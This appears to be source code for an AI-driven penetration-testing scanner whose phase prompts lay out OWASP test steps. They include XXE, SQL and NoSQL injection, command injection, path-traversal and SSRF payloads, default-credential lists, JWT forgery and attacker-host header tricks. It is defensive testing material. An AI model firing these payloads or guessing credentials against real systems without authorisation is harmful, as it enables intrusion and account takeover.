        id="web_a03_xxe",
        name="XML External Entity Injection",
        prompt=(
            "Test for XXE if the application processes XML. Follow these steps:\n\n"
            "STEP 1 — FIND XML INPUTS: Check for:\n"
            "  - API endpoints accepting Content-Type: application/xml or text/xml\n"
            "  - SOAP endpoints, RSS/Atom feeds, SVG upload, SAML authentication\n"
            "  - File upload accepting .xml, .svg, .xlsx, .docx\n"
            "  - Any endpoint where you can switch Content-Type from JSON to XML\n\n"
            "STEP 2 — BASIC XXE: Use api_request with Content-Type: application/xml:\n"
            "  <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
            "<root>&xxe;</root>\n"
            "  Windows: SYSTEM \"file:///c:/windows/win.ini\"\n\n"
            "STEP 3 — BLIND XXE: If no output reflected:\n"
            "  Parameter entities: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "
            "\"http://127.0.0.1:22\">%xxe;]>\n"
            "  Internal subset: check for different error messages or timing\n\n"
            "STEP 4 — XXE via CONTENT-TYPE SWITCH: For JSON endpoints, try sending the same "
            "data as XML by changing Content-Type to application/xml. Many frameworks "
            "auto-parse both formats.\n\n"
            "STEP 5 — XXE via FILE UPLOAD: If SVG upload is supported:\n"
            "  <svg xmlns=\"http://www.w3.org/2000/svg\">"
            "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
            "<text>&xxe;</text></svg>\n\n"
            "Check for file contents in response = confirmed XXE (Critical severity)."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a04",
        name="Insecure Design",
        prompt=(
            "Test insecure design and business logic flaws. Follow these steps:\n\n"
            "STEP 1 — FIND BUSINESS FLOWS: Identify:\n"
            "  - Price/quantity fields (cart, checkout, order)\n"
            "  - Multi-step processes (registration, checkout, password reset)\n"
            "  - Coupon/discount/promo code inputs\n"
            "  - Referral/reward systems\n"
            "  - State-changing operations (transfer, approve, delete)\n\n"
            "STEP 2 — PARAMETER TAMPERING: Use api_request to:\n"
            "  - Set price to 0, -1, 0.01, or 99999999\n"
            "  - Set quantity to -1, 0, 99999, or negative values\n"
            "  - Change currency codes (USD→VND for 23000x less value)\n"
            "  - Modify total amount in the request while keeping items same\n"
            "  - Add role=admin, isAdmin=true to any POST/PUT body\n\n"
            "STEP 3 — STEP SKIPPING: Attempt to:\n"
            "  - Access step 3 URL directly without completing step 1-2\n"
            "  - Complete checkout without payment step\n"
            "  - Verify account without clicking email verification link\n"
            "  - Reset password without providing current password\n\n"
            "STEP 4 — COUPON/DISCOUNT ABUSE:\n"
            "  - Apply the same coupon code multiple times\n"
            "  - Apply coupon after checkout total is calculated\n"
            "  - Try coupon codes: TEST, PROMO, ADMIN, 100OFF, FREE\n\n"
            "STEP 5 — VERIFY: Compare responses with normal flow. Any unexpected success, "
            "price difference, or unauthorized state change indicates insecure design."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a05",
        name="Security Misconfiguration",
        prompt=(
            "Check security misconfiguration. Follow these steps:\n\n"
            "STEP 1 — CORS: Use api_request with header Origin: https://evil.com and check:\n"
            "  - Access-Control-Allow-Origin reflects evil.com? = misconfigured CORS\n"
            "  - Access-Control-Allow-Credentials: true with wildcard origin? = critical\n"
            "  Test on main page AND API endpoints.\n\n"
            "STEP 2 — ERROR HANDLING: Trigger errors to check verbosity:\n"
            "  - Navigate to non-existent paths: /nonexistent, /api/v99/test\n"
            "  - Send malformed requests: api_request with invalid JSON body\n"
            "  - Check if stack traces, framework versions, or internal paths are exposed\n\n"
            "STEP 3 — DIRECTORY LISTING: Navigate to common directories:\n"
            "  /uploads/, /static/, /files/, /backup/, /api/, /docs/\n"
            "  Check if directory contents are listed.\n\n"
            "STEP 4 — DEBUG ENDPOINTS: Check for:\n"
            "  /debug, /trace, /actuator, /actuator/health, /actuator/env,\n"
            "  /_debug, /phpinfo.php, /server-status, /elmah.axd, /swagger-ui/\n\n"
            "STEP 5 — DEFAULT CREDENTIALS: Try common logins:\n"
            "  admin/admin, admin/password, admin/123456, test/test\n"
            "  Use inject_payload or api_request on the login form.\n\n"
            "STEP 6 — HTTP METHODS: Use api_request with OPTIONS method on main endpoints "
            "to discover allowed methods. TRACE method enabled = security risk."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a06",
        name="Vulnerable Components",
        prompt=(
            "Identify vulnerable and outdated components. Follow these steps:\n\n"
            "STEP 1 — FINGERPRINT SERVER: Use api_request on the main page and check:\n"
            "  - Server header (e.g. Apache/2.4.49, nginx/1.19)\n"
            "  - X-Powered-By header (e.g. Express, PHP/7.4, ASP.NET)\n"
            "  - Response patterns revealing framework (e.g. __VIEWSTATE for ASP.NET)\n\n"
            "STEP 2 — FINGERPRINT JS LIBRARIES: Use execute_js to check:\n"
            "  - jQuery version: typeof jQuery !== 'undefined' && jQuery.fn.jquery\n"
            "  - Angular: document.querySelector('[ng-version]')?.getAttribute('ng-version')\n"
            "  - React: typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined'\n"
            "  - Check page source for CDN links with version numbers\n\n"
            "STEP 3 — CHECK FOR KNOWN VULNS: For each identified version:\n"
            "  - jQuery < 3.5.0 has XSS vulnerabilities\n"
            "  - Angular < 1.6.0 has sandbox escape\n"
            "  - Express without security headers\n"
            "  - Apache/nginx versions with known CVEs\n\n"
            "STEP 4 — CHECK PACKAGE FILES: Navigate to:\n"
            "  /package.json, /composer.json, /Gemfile, /requirements.txt, /pom.xml\n"
            "  These may expose all dependencies and versions."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a07",
        name="Authentication Failures",
        prompt=(
            "Test authentication security. Follow these steps:\n\n"
            "STEP 1 — ANALYZE AUTH MECHANISM: Use get_cookies and get_local_storage.\n"
            "  - Is auth via cookies, JWT, or API key?\n"
            "  - If JWT: decode it (base64), check algorithm, claims, expiry\n\n"
            "STEP 2 — TOKEN MANIPULATION: Use api_request with:\n"
            "  - No token/cookie: check if endpoints return 401 or allow access\n"
            "  - Invalid token: 'Authorization: Bearer invalid_token_123'\n"
            "  - Expired token: modify exp claim to past date\n"
            "  - JWT alg:none: set header to {\"alg\":\"none\"} and remove signature\n"
            "  - JWT key confusion: if RS256, try HS256 with public key as secret\n"
            "  CHECK: Server should return 401/403. If it returns 500 = broken error handling.\n\n"
            "STEP 3 — BRUTE FORCE RESISTANCE: Use api_request to send 50 rapid login "
            "attempts with WRONG passwords (use random strings). Count how many succeed "
            "without any blocking (no 429, no CAPTCHA, no lockout message). "
            "Only report 'No Rate Limiting' if ALL 50 attempts return the same non-blocking "
            "response. Include exact count in evidence: 'N/50 attempts unblocked'.\n\n"
            "STEP 4 — SESSION FIXATION: Get session cookie BEFORE login, login, compare.\n"
            "  If the session cookie doesn't change = session fixation vulnerability.\n\n"
            "STEP 5 — CREDENTIAL TESTING (MANDATORY — always perform this step):\n"
            "  You MUST attempt credential discovery against every discovered login endpoint.\n"
            "  Use api_request (NOT inject_payload) to POST to the actual login API, because\n"
            "  many apps only expose the attackable login via JSON/REST, not the HTML form.\n"
            "  A successful login (200 + valid session/token) is a HIGH severity finding.\n\n"
            "  (a) DEFAULT / WEAK CREDENTIALS — try each of these on at least one login endpoint:\n"
            "      admin:admin, admin:password, admin:admin123, admin:123456,\n"
            "      administrator:administrator, root:root, root:toor,\n"
            "      test:test, test:test123, guest:guest, user:user,\n"
            "      demo:demo, dev:dev, support:support\n\n"
            "  (b) EMAIL-FORMAT USERNAMES — many apps use email addresses as logins. Try:\n"
            "      admin@<host>:admin, admin@<host>:admin123, admin@juice-sh.op:admin123,\n"
            "      test@test.com:test123, admin@example.com:password\n"
            "      (substitute <host> with the target's domain from the URL)\n\n"
            "  (c) SQL INJECTION LOGIN BYPASS — classic, still works on vulnerable apps:\n"
            "      email/username field: admin' --   OR   ' OR 1=1 --   OR   \" OR \"1\"=\"1\n"
            "      password field: anything\n"
            "      If login succeeds with these → CRITICAL SQLi + Auth Bypass.\n\n"
            "  (d) AUTHENTICATION BYPASS — probe common admin endpoints WITHOUT logging in:\n"
            "      /admin, /api/admin, /api/v1/admin, /dashboard, /actuator, /console,\n"
            "      /swagger, /api-docs — do any return 200 without authentication?\n\n"
            "  HOW TO REPORT: If you successfully authenticate with a default/guessed password,\n"
            "  emit a finding with title 'Default Credentials Accepted: <user>:<pass>' severity=High.\n"
            "  If SQLi bypass works, emit 'SQL Injection Authentication Bypass' severity=Critical.\n"
            "  DO NOT skip this step even if you found other auth issues — credential cracking\n"
            "  is a distinct, high-impact class of finding that must be tested independently."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a08",
        name="Software and Data Integrity Failures",
        prompt=(
            "Check software and data integrity. Follow these steps:\n\n"
            "STEP 1 — SRI CHECK: Use execute_js to find all <script> and <link> tags:\n"
            "  document.querySelectorAll('script[src], link[href]')\n"
            "  Check which external resources LACK integrity attribute (SRI).\n"
            "  External CDN scripts without SRI = supply chain attack risk.\n\n"
            "STEP 2 — PROTOTYPE POLLUTION: Use execute_js to test:\n"
            "  - Navigate to URL with ?__proto__[test]=polluted or ?constructor[prototype][test]=polluted\n"
            "  - Then check: execute_js('return ({}).test') — if it returns 'polluted', confirmed\n"
            "  - Also try JSON bodies: {\"__proto__\":{\"admin\":true}}\n\n"
            "STEP 3 — DESERIALIZATION: Check if the app accepts serialized objects:\n"
            "  - Look for base64-encoded cookies that decode to JSON or serialized objects\n"
            "  - Test by modifying serialized data and checking server behavior\n\n"
            "STEP 4 — CDN INTEGRITY: Check if JS/CSS loaded from third-party CDNs "
            "could be tampered with. List all external resource URLs."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a09",
        name="Logging and Monitoring Failures",
        prompt=(
            "Test for logging and monitoring failures. Follow these steps:\n\n"
            "STEP 1 — ERROR LEAKAGE: Trigger errors and check response verbosity:\n"
            "  - api_request with invalid JSON body — does it expose stack trace?\n"
            "  - Navigate to /error, /debug/error — any sensitive data leaked?\n"
            "  - Send malformed headers — does error reveal server internals?\n\n"
            "STEP 2 — SENSITIVE DATA IN ERRORS: Check if error responses contain:\n"
            "  - Database connection strings or queries\n"
            "  - Internal file paths or server architecture details\n"
            "  - User data from other sessions\n"
            "  - API keys or credentials\n\n"
            "STEP 3 — RATE LIMITING ON SECURITY EVENTS: Send 50 rapid failed logins "
            "(use random passwords). Track the count of unblocked attempts.\n"
            "  Only report 'No Rate Limiting' if ALL 50 return the same response "
            "(no 429, no CAPTCHA, no lockout). Include count in evidence.\n"
            "  No rate limiting on auth = monitoring failure."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_a10",
        name="Server-Side Request Forgery",
        prompt=(
            "Test for SSRF. Follow these steps:\n\n"
            "STEP 1 — FIND URL PARAMETERS: Look for parameters that accept URLs:\n"
            "  - Query params: ?url=, ?redirect=, ?next=, ?dest=, ?callback=, ?feed=\n"
            "  - Form fields: image URL, webhook URL, import URL, profile picture URL\n"
            "  - API params: proxy, fetch, download, link, source, uri\n\n"
            "STEP 2 — TEST INTERNAL ACCESS: Use fuzz_parameter or api_request with:\n"
            "  - http://127.0.0.1, http://localhost, http://0.0.0.0\n"
            "  - http://127.0.0.1:22 (SSH), http://127.0.0.1:3306 (MySQL)\n"
            "  - http://169.254.169.254/latest/meta-data/ (AWS metadata)\n"
            "  - http://metadata.google.internal/ (GCP metadata)\n"
            "  - file:///etc/passwd, file:///c:/windows/win.ini\n\n"
            "STEP 3 — BYPASS FILTERS: If basic URLs are blocked, try:\n"
            "  - http://0x7f000001 (hex IP), http://2130706433 (decimal IP)\n"
            "  - http://127.0.0.1.nip.io, http://127.1, http://[::1]\n"
            "  - URL encoding: http://%31%32%37.0.0.1\n"
            "  - DNS rebinding: use a domain that resolves to 127.0.0.1\n\n"
            "STEP 4 — CHECK OPEN REDIRECT: Test redirect parameters with external URLs:\n"
            "  ?redirect=https://evil.com, ?next=//evil.com, ?url=/\\evil.com\n\n"
            "Check if the application follows the redirect or fetches the internal resource."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_websocket",
        name="WebSocket testing",
        prompt=(
            "Test WebSocket endpoints for security issues. Follow these steps:\n\n"
            "STEP 1 — DISCOVER WS ENDPOINTS: Check get_network_log for ws:// or wss:// URLs.\n"
            "  Also check page source for WebSocket constructor calls.\n\n"
            "STEP 2 — CONNECT: Use ws_connect(url) to open a connection. It returns a connection_id — "
            "use that connection_id in ALL subsequent ws_send, ws_receive, ws_inject, ws_close calls.\n\n"
            "STEP 3 — TEST INJECTION: Use ws_inject(connection_id, payload) with:\n"
            "  - SQL: {\"query\":\"' OR 1=1--\"}\n"
            "  - XSS: {\"message\":\"<script>alert(1)</script>\"}\n"
            "  - IDOR: Change user IDs in messages\n"
            "  - Large payload: send 100KB of data\n\n"
            "STEP 4 — TEST AUTH: Open a new ws_connect WITHOUT auth cookies/tokens.\n"
            "  Can you receive messages? Send messages? = broken WS auth.\n\n"
            "STEP 5 — CROSS-ORIGIN: Check if WS endpoint validates Origin header."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_extras",
        name="Beyond OWASP",
        prompt=(
            "Test additional attack vectors. Follow these steps:\n\n"
            "STEP 1 — OPEN REDIRECT: Find redirect parameters (?redirect=, ?next=, ?url=, ?return=).\n"
            "  Test with: https://evil.com, //evil.com, /\\evil.com, /%09/evil.com\n"
            "  Check Location header and page navigation.\n\n"
            "STEP 2 — CRLF INJECTION: Use fuzz_parameter with header payloads:\n"
            "  test%0d%0aInjected-Header:true, test%0aSet-Cookie:evil=1\n"
            "  Check if injected headers appear in the response.\n\n"
            "STEP 3 — CLICKJACKING: Check if X-Frame-Options or CSP frame-ancestors is set.\n"
            "  If missing, the page can be embedded in an iframe = clickjacking risk.\n\n"
            "STEP 4 — CSRF: For state-changing forms/APIs, check:\n"
            "  - Is there a CSRF token in forms? In headers?\n"
            "  - Try submitting without the CSRF token — does it still work?\n"
            "  - Try with a different token value — does it validate?\n\n"
            "STEP 5 — CORS: Send api_request with Origin: https://evil.com header.\n"
            "  Check Access-Control-Allow-Origin in response. Wildcard with credentials = critical."
        ),
        applies_to="website",
    ),
    ScanPhase(
        id="web_race_condition",
        name="Race Condition Testing",
        prompt=(
            "Test for race conditions on state-changing operations. Follow these steps:\n\n"
            "STEP 1 — IDENTIFY TARGETS: Find endpoints that modify state:\n"
            "  - Coupon/promo code application, discount redemption\n"
            "  - Account balance changes, money transfers\n"
            "  - Vote/like/favorite actions, rating systems\n"
            "  - Item checkout, purchase, order placement\n"
            "  - Invitation acceptance, email verification\n"
            "  - Password/email change, account deletion\n\n"
            "STEP 2 — FIRE PARALLEL REQUESTS: Use execute_js with Promise.all to send "
            "concurrent identical requests. Example:\n"
            "  execute_js(\"return Promise.all(Array(10).fill().map(() => "
            "fetch('/api/apply-coupon', {method:'POST', headers:{'Content-Type':'application/json'}, "
            "body:JSON.stringify({code:'DISCOUNT10'})}).then(r=>r.json().catch(()=>r.status))))\")\n"
            "This fires all 10 requests simultaneously from the browser.\n\n"
            "STEP 3 — CHECK RESULTS: If the coupon was applied 10 times, or balance deducted "
            "multiple times, or multiple votes registered = race condition confirmed.\n\n"
            "STEP 4 — TOCTOU: Rapidly alternate between a check endpoint and an action endpoint:\n"
            "  - Check balance → Transfer money (repeat rapidly)\n"
            "  - Check item availability → Purchase (repeat rapidly)\n\n"
            "Only test endpoints you already discovered. This is High severity when it "
            "affects financial operations."
        ),
        max_steps=30,
        applies_to="website",
    ),
    ScanPhase(
        id="web_host_header",
        name="Host Header Poisoning",
        prompt=("Test Host header attacks. Send requests with: "
                "(1) a modified Host header pointing to attacker.com, "
                "(2) X-Forwarded-Host: attacker.com, "
                "(3) X-Forwarded-For: 127.0.0.1, "
                "(4) Host header with port injection (evil.com:80@target). "
                "Check if the response reflects the injected host in any URLs, "
                "redirects (Location header), password reset links, canonical URLs, "
                "or HTML content. Also test if X-Forwarded-Host bypasses access controls. "
                "Focus on password reset, email verification, and redirect endpoints."),
        max_steps=20,
        applies_to="website",
    ),
    ScanPhase(
        id="web_timing_enum",
        name="Timing-Based Enumeration",
        prompt=("Test for timing-based user enumeration. "
                "Craft requests to login or password-reset endpoints with: "
                "(1) a known-valid username/email + wrong password, "
                "(2) a non-existent username/email + wrong password. "
                "Measure response times for each (send 3 requests per variant). "
                "A consistent timing difference >100ms between valid and invalid usernames "
                "indicates user enumeration. Also check for different HTTP status codes, "
                "response sizes, or error messages between valid/invalid usernames. "
                "Test on signup endpoints too — 'email already exists' responses."),
        max_steps=20,
        applies_to="website",
    ),
    ScanPhase(
        id="web_bfla",
        name="Broken Function-Level Authorization",
        prompt=("Test for broken function-level authorization (BFLA). "
                "From the application map, identify admin/privileged endpoints by looking for: "
                "URL patterns containing /admin/, /manage/, /settings/, /config/, /users/, "
                "/roles/, /permissions/, /internal/, /system/, /debug/. "
                "Also look for API endpoints discovered during recon that accept PUT/DELETE/PATCH. "
                "Attempt to access these endpoints with the current user's session token. "
                "Check if changing HTTP method (GET to POST, POST to PUT) reveals different "
                "functionality. Test if adding parameters like ?admin=true or role=admin "
                "grants elevated access. Focus on vertical privilege escalation."),
        max_steps=25,
        applies_to="website",
    ),
    ScanPhase(
        id="web_file_upload",
        name="File Upload Testing",
        prompt=("Test for unrestricted file upload vulnerabilities. "
                "Identify file upload forms or endpoints (look for <input type='file'>, "
                "multipart/form-data forms, drag-and-drop zones, or API endpoints accepting files). "
                "For each upload point, test: "
                "(1) Upload a file with a server-executable extension (.php, .asp, .aspx, .jsp, .py, .cgi) "
                "with benign content like <?php echo 'test'; ?> — check if the server stores and serves it. "
                "(2) Double extension bypass: file.php.jpg, file.asp;.jpg, file.php%00.jpg. "
                "(3) Content-Type mismatch: send a .php file with Content-Type: image/jpeg. "
                "(4) SVG with embedded JavaScript: <svg><script>alert(1)</script></svg>. "
                "(5) Oversized file (>50MB if possible) to test upload limits. "
                "(6) Null byte in filename: file.php\\x00.jpg. "
                "After upload, attempt to access the uploaded file URL directly. "
                "If the file executes (PHP, JSP), this is Critical RCE."),
        max_steps=30,
        applies_to="website",
    ),
    ScanPhase(
        id="web_password_reset",
        name="Password Reset Flow Testing",
        prompt=("Test the password reset/forgot password flow for security weaknesses. "
                "Locate the password reset functionality (look for 'Forgot Password', "
                "'Reset Password' links). Test: "
                "(1) Account enumeration: submit a valid email vs non-existent email and compare "
                "response messages, HTTP status codes, and response sizes. Different responses reveal "
                "which accounts exist. "
                "(2) If you receive a reset token/link, check token length and entropy. "
                "Short or predictable tokens can be brute-forced. "
                "(3) Submit the same reset request twice — does it invalidate the first token? "
                "(4) Check if the reset page accepts the password change without the old password. "
                "(5) Test Host header injection on the reset endpoint: set Host: attacker.com and check "
                "if the reset link in any response contains attacker.com. "
                "IMPORTANT: Only test with the scan's own email address. Do not test with other emails."),
        max_steps=25,
        applies_to="website",
    ),
    ScanPhase(
        id="web_session_mgmt",
        name="Session Management Testing",
        prompt=("Test session management security. "
                "(1) Check if the session cookie changes after login (session fixation). "
                "Record the session cookie/token BEFORE login, compare AFTER login — they must differ. "
                "(2) Check session cookie properties: is it HttpOnly? Secure? SameSite? "
                "(3) Test concurrent sessions: make a second authenticated request from a different "
                "context and check if the original session is still valid. "
                "(4) Check if session token appears in URLs (query strings or path). "
                "(5) Test if accessing a 'change password' or 'change email' endpoint invalidates "
                "existing sessions or requires re-authentication. "
                "(6) Check session token length and entropy — short tokens are brute-forceable. "
                "IMPORTANT: Do NOT click logout or signout. Only inspect cookies and compare values."),
        max_steps=20,
        applies_to="website",
    ),
]

API_PHASES: list[ScanPhase] = [
    ScanPhase(
        id="api_recon",
        name="Endpoint discovery",
        prompt=(
            "Map ALL API endpoints. Follow these steps:\n\n"
            "STEP 1 — IMPORTED ENDPOINTS: Call get_api_endpoints to see endpoints from imports.\n\n"
            "STEP 2 — DISCOVER MORE: Use api_request with OPTIONS method on base paths:\n"
            "  /api, /api/v1, /api/v2, /rest, /graphql, /v1, /v2\n"
            "  Check Allow header for supported methods.\n\n"
            "STEP 3 — COMMON PATHS: Try api_request GET on:\n"
            "  /swagger.json, /openapi.json, /api-docs, /swagger-ui/,\n"
            "  /health, /status, /version, /info, /actuator, /metrics\n\n"
            "STEP 4 — PATTERN DISCOVERY: From known endpoints, infer related ones.\n"
            "  If /api/users exists, try /api/users/1, /api/users/me, /api/users/admin.\n"
            "  If /api/v1/x exists, try /api/v2/x.\n\n"
            "Record every endpoint that returns a non-404 response."
        ),
        applies_to="api",
        parallel_ok=False,
    ),
    ScanPhase(
        id="api_auth",
        name="Authentication testing",
        prompt=(
            "Test API authentication security. Follow these steps:\n\n"
            "STEP 1 — MISSING AUTH: Use test_auth_bypass on EVERY discovered endpoint.\n"
            "  If any endpoint returns 200 without auth = missing authentication.\n\n"
            "STEP 2 — BROKEN TOKEN VALIDATION: Use api_request with:\n"
            "  - Authorization: Bearer invalid_token\n"
            "  - Authorization: Bearer (empty)\n"
            "  - Authorization: Bearer null\n"
            "  - No Authorization header at all\n"
            "  Expected: 401 or 403. If 500 = broken error handling.\n"
            "  If 200 = authentication bypass.\n\n"
            "STEP 3 — JWT MANIPULATION (if JWT auth):\n"
            "  - Decode JWT, change 'alg' to 'none', remove signature\n"
            "  - Change role/admin claims and re-sign\n"
            "  - Use expired JWT — does server still accept it?\n"
            "  - Change user ID in JWT payload\n\n"
            "STEP 4 — TOKEN REUSE: If multiple APIs/contexts exist, try using\n"
            "  tokens from one context in another.\n\n"
            "STEP 5 — CREDENTIAL TESTING (MANDATORY — always perform this step):\n"
            "  Identify the login/authentication endpoint(s) from the crawl and API imports\n"
            "  (e.g. /api/login, /api/auth, /rest/user/login, /oauth/token, /api/v1/auth/login).\n"
            "  You MUST POST credential pairs via api_request. A successful auth response\n"
            "  (token/session returned) with a default password is a HIGH severity finding.\n\n"
            "  (a) DEFAULT / WEAK CREDENTIALS — try at least:\n"
            "      admin:admin, admin:password, admin:admin123, admin:123456,\n"
            "      administrator:administrator, root:root, test:test, test:test123,\n"
            "      guest:guest, user:user, demo:demo\n\n"
            "  (b) EMAIL-FORMAT LOGINS — try:\n"
            "      admin@<host>:admin123, admin@juice-sh.op:admin123,\n"
            "      test@test.com:test123, admin@example.com:password\n\n"
            "  (c) SQL INJECTION AUTH BYPASS — classic payload that still works:\n"
            "      {\"email\":\"admin' --\",\"password\":\"anything\"}\n"
            "      {\"email\":\"' OR 1=1 --\",\"password\":\"x\"}\n"
            "      {\"username\":\"\\\" OR \\\"1\\\"=\\\"1\",\"password\":\"x\"}\n"
            "      If 200 + valid token returned → CRITICAL SQLi + Auth Bypass.\n\n"
            "  REPORT: emit 'Default Credentials Accepted: <user>:<pass>' (High) on success,\n"
            "  or 'SQL Injection Authentication Bypass' (Critical) if SQLi works.\n"
            "  DO NOT skip this step. Credential cracking is a distinct finding class that\n"
            "  must be tested independently of token/JWT manipulation.\n\n"
            "For EVERY test, record the exact endpoint, token used, and response status."
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_authz",
        name="Authorization / BOLA",
        prompt=(
            "Test API authorization (BOLA/IDOR). Follow these steps:\n\n"
            "STEP 1 — FIND OBJECT IDS: Review all discovered endpoints for IDs:\n"
            "  - Path: /api/users/{id}, /api/orders/{id}\n"
            "  - Query: ?user_id=123, ?order=456\n"
            "  - Body: {\"userId\": 123}\n\n"
            "STEP 2 — TEST IDOR: For each ID, use api_request to:\n"
            "  - Change ID to another user's: id → id+1, id-1\n"
            "  - Try ID=0, ID=1 (often admin)\n"
            "  - Try UUID manipulation if applicable\n"
            "  Compare response — can you see another user's data?\n\n"
            "STEP 3 — HORIZONTAL ESCALATION: Access resources belonging to other users.\n"
            "  GET /api/users/2 with User A's token — should return 403.\n\n"
            "STEP 4 — VERTICAL ESCALATION: Try accessing admin endpoints:\n"
            "  GET /api/admin/users, DELETE /api/users/2, PUT /api/users/2/role\n"
            "  with a regular user's token.\n\n"
            "Record every test: endpoint, original ID, modified ID, response."
            "{bola_user_b_api}"
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_injection",
        name="Endpoint injection testing",
        prompt=(
            "Test injection on ALL discovered API endpoints. Follow these steps:\n\n"
            "STEP 1 — LIST TARGETS: Call get_api_endpoints. Every endpoint accepting "
            "parameters (query, path, body, headers) needs injection testing.\n\n"
            "STEP 2 — SQL INJECTION: Use fuzz_parameter with baseline_value='test' on each param:\n"
            "  Error-based: ' , \" , ') , ; , -- , # , ' OR '1'='1\n"
            "  UNION: ' UNION SELECT NULL-- , ' UNION SELECT 1,2,3--\n"
            "  Boolean blind: ' AND 1=1-- vs ' AND 1=2-- (compare responses)\n"
            "  Time-based: ' OR SLEEP(3)-- , '; WAITFOR DELAY '0:0:3'--\n"
            "  CRITICAL: Set baseline_value='test' so payloads are APPENDED.\n"
            "  For JSON bodies: api_request with {\"field\":\"test' OR 1=1--\"}\n\n"
            "STEP 3 — NoSQL INJECTION (JSON APIs):\n"
            "  {\"field\":{\"$gt\":\"\"}} , {\"field\":{\"$ne\":null}}\n"
            "  {\"field\":{\"$regex\":\".*\"}} , {\"field\":{\"$where\":\"1==1\"}}\n"
            "  Query param form: field[$ne]=null , field[$gt]=\n\n"
            "STEP 4 — XSS: fuzz_parameter with baseline_value and:\n"
            "  <script>alert(1)</script> , <img src=x onerror=alert(1)> , '\"><svg/onload=alert(1)>\n"
            "  Check if response reflects payload unescaped.\n\n"
            "STEP 5 — COMMAND INJECTION: For params that suggest system interaction:\n"
            "  ; id , | id , $(id) , `id` , ; sleep 5\n\n"
            "STEP 6 — PATH TRAVERSAL: For file-related params:\n"
            "  ../../../etc/passwd , ..%2f..%2f..%2fetc%2fpasswd\n\n"
            "STEP 7 — XXE: If any endpoint accepts XML:\n"
            "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>\n"
            "  Also try switching Content-Type from application/json to application/xml.\n\n"
            "CRITICAL: Test EVERY endpoint, not just one. Check VULNERABILITIES_DETECTED flags. "
            "If you see a 500 error, dig deeper — it likely means the injection is working."
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_mass_assign",
        name="Mass assignment",
        prompt=(
            "Test for mass assignment vulnerabilities. Follow these steps:\n\n"
            "STEP 1 — IDENTIFY ENDPOINTS: Find POST/PUT/PATCH endpoints that accept JSON bodies.\n\n"
            "STEP 2 — ADD EXTRA FIELDS: Use api_request to send the normal body plus:\n"
            "  - {\"role\":\"admin\"}, {\"isAdmin\":true}, {\"admin\":1}\n"
            "  - {\"verified\":true}, {\"active\":true}, {\"premium\":true}\n"
            "  - {\"price\":0}, {\"discount\":100}, {\"balance\":999999}\n"
            "  - {\"email\":\"attacker@evil.com\"}, {\"password\":\"newpass\"}\n\n"
            "STEP 3 — VERIFY: After sending, GET the resource and check if the extra "
            "fields were persisted. If role changed to admin = critical mass assignment.\n\n"
            "STEP 4 — SCHEMA INFERENCE: Look at GET responses to discover field names, "
            "then try to SET those fields that should be read-only."
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_rate_limit",
        name="Rate limiting",
        prompt=(
            "Test API rate limiting. Follow these steps:\n\n"
            "STEP 1 — IDENTIFY SENSITIVE ENDPOINTS: Login, registration, password reset,\n"
            "  OTP verification, payment, search — these MUST have rate limits.\n\n"
            "STEP 2 — TEST: Use api_request to send 10+ rapid requests to each endpoint.\n"
            "  Check if any returns 429 (Too Many Requests).\n"
            "  No 429 after 10+ rapid requests = missing rate limiting.\n\n"
            "STEP 3 — BYPASS: If rate limited, try:\n"
            "  - Add X-Forwarded-For: [random IP] header\n"
            "  - Change User-Agent header\n"
            "  - Add null bytes to parameters\n"
            "  Do these bypass the rate limit?\n\n"
            "Missing rate limiting on auth endpoints = brute-force risk (High severity)."
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_ssrf",
        name="SSRF testing",
        prompt=(
            "Test API endpoints for SSRF. Follow these steps:\n\n"
            "STEP 1 — FIND URL PARAMS: Check all endpoints for URL-accepting parameters:\n"
            "  url, uri, link, callback, webhook, redirect, proxy, fetch, source, target\n\n"
            "STEP 2 — TEST INTERNAL ACCESS: Use fuzz_parameter or api_request with:\n"
            "  http://127.0.0.1, http://localhost, http://169.254.169.254/latest/meta-data/\n"
            "  http://metadata.google.internal/, file:///etc/passwd\n\n"
            "STEP 3 — BYPASS FILTERS: If blocked, try:\n"
            "  http://0x7f000001, http://2130706433, http://127.1\n"
            "  http://[::1], http://127.0.0.1.nip.io\n\n"
            "STEP 4 — OPEN REDIRECT CHAINS: If an endpoint has an open redirect,\n"
            "  use it as a stepping stone for SSRF: redirect → internal resource."
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_graphql",
        name="GraphQL testing",
        prompt=(
            "Test GraphQL endpoint security. Follow these steps:\n\n"
            "STEP 1 — FIND GRAPHQL: Check /graphql, /graphql/v1, /api/graphql.\n\n"
            "STEP 2 — INTROSPECTION: Use api_request POST with:\n"
            "  {\"query\": \"{__schema{types{name,fields{name}}}}\"}\n"
            "  If it returns schema = introspection enabled (Information Disclosure).\n\n"
            "STEP 3 — QUERY BATCHING: Send array of queries:\n"
            "  [{\"query\":\"...\"},{\"query\":\"...\"}] — does it execute all?\n"
            "  Batching can be abused for brute-force.\n\n"
            "STEP 4 — DEEP NESTING: Send deeply nested query (10+ levels).\n"
            "  No depth limit = denial of service risk.\n\n"
            "STEP 5 — INJECTION: Test query variables with SQL/NoSQL payloads:\n"
            "  {\"query\":\"query($id:String!){user(id:$id){name}}\","
            "\"variables\":{\"id\":\"' OR 1=1--\"}}\n\n"
            "STEP 6 — AUTH BYPASS: Try queries without auth token."
        ),
        applies_to="api",
    ),
    ScanPhase(
        id="api_data_exposure",
        name="Excessive data exposure",
        prompt=(
